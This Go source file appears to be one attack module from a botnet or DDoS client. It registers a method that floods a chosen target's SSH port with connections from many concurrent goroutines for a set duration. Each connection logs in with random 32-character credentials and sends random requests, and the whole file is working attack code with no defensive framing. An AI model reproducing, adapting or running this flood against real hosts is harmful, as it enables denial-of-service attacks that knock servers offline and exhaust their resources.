package methodImpl

import (
	"client/core/modules/methods"
	"client/core/networking/encryption"
	"fmt"
	"golang.org/x/crypto/ssh"
	"time"
)

func init() {
	methods.Make(&methods.Method{
		Id: 4,
		Executor: func(targets []string, port int, duration int, flags map[int]interface{}) error {
			start := time.Now()
			addr := fmt.Sprintf("%s:%d", randomChoice(targets), port)

			threads, exists := flags[methods.FlagThreads]
			if !exists {
				threads = 1
			}

			for i := 0; i < threads.(int); i++ {
				go func() {
					for time.Since(start) < time.Duration(duration)*time.Second {
						config := &ssh.ClientConfig{
							User: encryption.Random(32),
							Auth: []ssh.AuthMethod{
								ssh.Password(encryption.Random(32)),
							},
						}

						conn, err := ssh.Dial("tcp", addr, config)
						if err != nil {
							continue
						}

						_, _, err = conn.SendRequest(encryption.Random(32), true, []byte(encryption.Random(32)))
						if err != nil {
							continue
						}
					}
				}()
			}
			return nil
		},
	})
}
